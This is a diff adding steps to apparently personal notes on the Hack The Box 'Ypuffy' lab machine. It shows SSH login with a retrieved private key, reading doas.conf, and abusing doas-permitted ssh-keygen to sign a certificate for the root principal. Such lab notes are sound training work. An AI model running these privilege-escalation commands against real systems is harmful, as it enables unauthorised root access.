@@ -45,3 +45,15 @@ Service Info: Host: YPUFFY
 get the private key
 
 6. ssh -i alice_private alice1978@10.10.10.107
+
+7. ypuffy$ cat /etc/doas.conf  
+permit keepenv :wheel
+permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
+
+8. 
+doas -u userca /usr/bin/ssh-keygen -f /tmp/userca
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n root -I terry /tmp/userca.pub
+
+9. ssh-keygen -Lf /tmp/userca-cert.pub   (view cert info)
+
+
